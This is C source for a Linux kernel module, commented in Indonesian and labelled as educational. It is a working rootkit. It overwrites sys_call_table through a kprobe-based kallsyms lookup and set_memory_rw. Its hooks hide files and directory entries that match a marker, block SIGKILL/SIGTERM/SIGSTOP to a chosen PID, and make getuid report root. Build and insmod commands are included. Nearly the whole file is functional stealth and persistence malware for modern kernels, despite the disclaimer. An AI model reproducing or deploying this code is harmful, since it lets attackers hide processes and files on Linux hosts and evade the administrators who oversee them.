// hook_syscall.c — Rootkit kernel klasik: menimpa sys_call_table.
//
// PERINGATAN PENTING:
//   - Kode ini butuh linux-headers-$(uname -r) untuk dikompilasi.
//   - Menimpa sys_call_table tetap teknik LAMA dan mudah dideteksi LKRG /
//     integrity checker. Materi edukasi, bukan untuk produksi.
//   - Sejak kernel 5.3, sys_call_table read-only. Kode ini TIDAK memakai
//     write_cr0() (CR0 pinning di kernel modern akan mengembalikan WP dan
//     memunculkan warning, lalu penulisan tabel memicu page fault/oops).
//     Yang dipakai: set_memory_rw()/set_memory_ro() pada halaman tabel.
//   - Ini tetap berbahaya: salah alamat/rentang = kernel oops. Uji di VM.
//
// Yang di-hook:
//   - openat      : path diawali hide_mark -> ENOENT (sembunyi file)
//   - getdents64  : filter entry direktori diawali hide_mark (sembunyi dari ls)
//   - kill/tgkill : tolak SIGKILL/SIGTERM/SIGSTOP ke pid target (anti-kill)
//   - getuid      : selalu kembalikan 0 (spoof root)
//
// Build (di mesin dengan kernel headers):
//   make -C /lib/modules/$(uname -r)/build M=$PWD modules
//   sudo insmod hook_syscall.ko        # pasang
//   sudo rmmod hook_syscall            # cabut (restore otomatis)
//   dmesg | tail                       # lihat log hook

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/signal.h>
#include <linux/mm.h>
#include <linux/version.h>
#include <asm/unistd.h>
#include <asm/page.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("lab xcb-v2");
MODULE_DESCRIPTION("Demo edukasi syscall hooking (sys_call_table overwrite)");

// ---- resolusi sys_call_table ----
// Sejak kernel 5.7, kallsyms_lookup_name tidak lagi diekspor. Trik umum:
// daftarkan kprobe pada "kallsyms_lookup_name" dan pinjam pointer-nya.

static unsigned long *syscall_table;

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

// set_memory_rw()/set_memory_ro() TIDAK diekspor ke modul (modpost:
// "undefined!"). Resolusi lewat kallsyms, sama seperti sys_call_table.
typedef int (*set_memory_fn)(unsigned long addr, int numpages);
static set_memory_fn set_memory_rw_fn;
static set_memory_fn set_memory_ro_fn;

static unsigned long resolve_syscall_table(void) {
    kallsyms_lookup_name_t lookup;
    if (register_kprobe(&kp) < 0)
        return 0;
    lookup = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    if (!lookup) return 0;
    set_memory_rw_fn = (set_memory_fn)lookup("set_memory_rw");
    set_memory_ro_fn = (set_memory_fn)lookup("set_memory_ro");
    return lookup("sys_call_table");
}

// ---- simpan pointer asli ----
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tgkill)(const struct pt_regs *);
static asmlinkage long (*orig_getuid)(const struct pt_regs *);

static char hide_mark[32] = "rahasia";
module_param_string(hide_mark, hide_mark, sizeof(hide_mark), 0644);

static int target_pid = -1;
module_param(target_pid, int, 0644);

// Indeks yang kita timpa. Rentang halaman dihitung dari sini; satu halaman
// biasanya memuat banyak entry, tapi jangan berasumsi — hitung min/maks.
static const int hooked_nrs[] = {__NR_openat, __NR_getdents64, __NR_kill,
                                 __NR_tgkill, __NR_getuid};
static unsigned long tbl_lo, tbl_hi;

// Tandai semua halaman yang memuat entry kita writable/read-only.
static int table_set_rw(bool writable) {
    const unsigned long start = tbl_lo & PAGE_MASK;
    const unsigned long end = (tbl_hi + sizeof(unsigned long) + PAGE_SIZE - 1) & PAGE_MASK;
    const int pages = (int)((end - start) >> PAGE_SHIFT);
    if (pages <= 0) return -EINVAL;
    if (writable && !set_memory_rw_fn) return -ENOENT;
    if (!writable && !set_memory_ro_fn) return -ENOENT;
    return writable ? set_memory_rw_fn(start, pages) : set_memory_ro_fn(start, pages);
}

// Baca string user dari pointer argumen register
static int read_user_str(const char __user *p, char *buf, size_t cap) {
    long n;
    if (!p || cap < 2) return -1;
    n = strncpy_from_user(buf, p, cap - 1);
    if (n < 0) return -1;
    buf[n] = '\0';
    return 0;
}

// Pencocokan prefiks, bukan substring: "rahasia" tidak boleh menyembunyikan
// "bukan-rahasia.txt" secara tak terduga.
static bool has_mark(const char *s) {
    return hide_mark[0] != '\0' && strncmp(s, hide_mark, strlen(hide_mark)) == 0;
}

// d_name di linux_dirent64 tidak dijamin NUL dalam satu record; batasi
// pencarian ke sisa record agar tidak membaca melewati buffer.
static bool dirent_has_mark(const struct linux_dirent64 *e, long avail) {
    const long off = offsetof(struct linux_dirent64, d_name);
    if (avail <= off) return false;
    const long max = avail - off;
    const size_t len = strnlen(e->d_name, (size_t)max);
    if (len == 0 || len >= (size_t)max) return false;
    return has_mark(e->d_name);
}

// ---- hook openat ----
static asmlinkage long hook_openat(const struct pt_regs *regs) {
    // x86-64: rdi=dirfd, rsi=pathname, rdx=flags
    char path[256];
    if (!read_user_str((const char __user *)regs->si, path, sizeof(path)) &&
        has_mark(path)) {
        pr_info("[hook] openat(%s) -> ENOENT (disembunyikan)\n", path);
        return -ENOENT;
    }
    return orig_openat(regs);
}

// ---- hook getdents64: filter entry dari listing direktori ----
// Batas: buffer user boleh jauh lebih besar dari satu batch. Filter bekerja
// per-batch dan tidak fail-open pada ukuran besar (tidak ada "n > batas".
// Buffer kerja dialokasikan sebesar n). Bila seluruh batch tersembunyi,
// kembalikan isi kosong — pemanggil akan meminta batch berikutnya.
static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    // rdi=fd, rsi=dirp, rdx=count
    long n = orig_getdents64(regs);
    char __user *buf;
    long in = 0, out = 0;
    char *tmp;

    if (n <= 0) return n;

    buf = (char __user *)regs->si;
    tmp = kmalloc(n, GFP_KERNEL);
    if (!tmp) return n;

    if (copy_from_user(tmp, buf, n)) {
        kfree(tmp);
        return n;
    }

    while (in < n) {
        struct linux_dirent64 *e = (struct linux_dirent64 *)(tmp + in);
        const long avail = n - in;
        if (e->d_reclen < offsetof(struct linux_dirent64, d_name) + 1 ||
            in + e->d_reclen > n)
            break;
        if (!dirent_has_mark(e, avail)) {
            if (out != in) memmove(tmp + out, e, e->d_reclen);
            out += e->d_reclen;
        }
        in += e->d_reclen;
    }
    if (out > 0 && copy_to_user(buf, tmp, out)) {
        kfree(tmp);
        return -EFAULT;
    }
    kfree(tmp);
    return out;
}

// ---- hook kill/tgkill: anti-kill untuk pid target ----
static bool protected_signal(int sig) {
    return sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP;
}

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    // rdi=pid, rsi=sig
    const pid_t pid = (pid_t)regs->di;
    const int sig = (int)regs->si;
    // pid negatif = process group: cocokkan -pid.
    if (target_pid > 0 && (pid == target_pid || pid == -target_pid) &&
        protected_signal(sig)) {
        pr_info("[hook] kill(%d, %d) ditolak (anti-kill)\n", pid, sig);
        return -EPERM;
    }
    return orig_kill(regs);
}

static asmlinkage long hook_tgkill(const struct pt_regs *regs) {
    // rdi=tgid, rsi=tid, rdx=sig
    const pid_t tgid = (pid_t)regs->di;
    const pid_t tid = (pid_t)regs->si;
    const int sig = (int)regs->dx;
    if (target_pid > 0 && (tid == target_pid || tgid == target_pid) && protected_signal(sig)) {
        pr_info("[hook] tgkill(%d, %d, %d) ditolak (anti-kill)\n", tgid, tid, sig);
        return -EPERM;
    }
    return orig_tgkill(regs);
}

// ---- hook getuid: spoof jadi root ----
static asmlinkage long hook_getuid(const struct pt_regs *regs) {
    (void)regs;
    return 0;
}

// ---- pasang / cabut ----
static int install_hooks(void) {
    int i;
    int ret;

    ret = table_set_rw(true);
    if (ret) {
        pr_err("[hook] set_memory_rw gagal: %d\n", ret);
        return ret;
    }

    orig_openat     = (void *)syscall_table[__NR_openat];
    orig_getdents64 = (void *)syscall_table[__NR_getdents64];
    orig_kill       = (void *)syscall_table[__NR_kill];
    orig_tgkill     = (void *)syscall_table[__NR_tgkill];
    orig_getuid     = (void *)syscall_table[__NR_getuid];

    syscall_table[__NR_openat]     = (unsigned long)hook_openat;
    syscall_table[__NR_getdents64] = (unsigned long)hook_getdents64;
    syscall_table[__NR_kill]       = (unsigned long)hook_kill;
    syscall_table[__NR_tgkill]     = (unsigned long)hook_tgkill;
    syscall_table[__NR_getuid]     = (unsigned long)hook_getuid;

    ret = table_set_rw(false);
    if (ret) pr_err("[hook] set_memory_ro gagal: %d\n", ret);

    for (i = 0; i < (int)ARRAY_SIZE(hooked_nrs); i++)
        pr_info("[hook] terlindungi: syscall %d\n", hooked_nrs[i]);
    return 0;
}

static int __init hook_init(void) {
    size_t i;

    // hide_mark kosong membuat strncmp("") selalu cocok -> SEMUA openat
    // ENOENT dan SEMUA entry getdents tersembunyi (sistem tidak bisa dipakai).
    if (hide_mark[0] == '\0') {
        pr_err("[hook] hide_mark kosong: tolak load\n");
        return -EINVAL;
    }

    syscall_table = (unsigned long *)resolve_syscall_table();
    if (!syscall_table) {
        pr_err("[hook] gagal resolve sys_call_table\n");
        return -EINVAL;
    }
    pr_info("[hook] sys_call_table @ %px\n", syscall_table);

    // Rentang entry yang akan ditimpa (untuk set_memory_rw/ro).
    tbl_lo = (unsigned long)&syscall_table[hooked_nrs[0]];
    tbl_hi = tbl_lo;
    for (i = 1; i < ARRAY_SIZE(hooked_nrs); i++) {
        const unsigned long a = (unsigned long)&syscall_table[hooked_nrs[i]];
        if (a < tbl_lo) tbl_lo = a;
        if (a > tbl_hi) tbl_hi = a;
    }

    return install_hooks();
}

static void __exit hook_exit(void) {
    if (!syscall_table) return;
    if (table_set_rw(true)) {
        pr_err("[hook] tidak bisa membuat tabel writable; hook tidak dicabut\n");
        return;
    }
    syscall_table[__NR_openat]     = (unsigned long)orig_openat;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_kill]       = (unsigned long)orig_kill;
    syscall_table[__NR_tgkill]     = (unsigned long)orig_tgkill;
    syscall_table[__NR_getuid]     = (unsigned long)orig_getuid;
    if (table_set_rw(false))
        pr_err("[hook] gagal mengembalikan tabel ke read-only\n");
    pr_info("[hook] dicabut, tabel direstore\n");
}

module_init(hook_init);
module_exit(hook_exit);
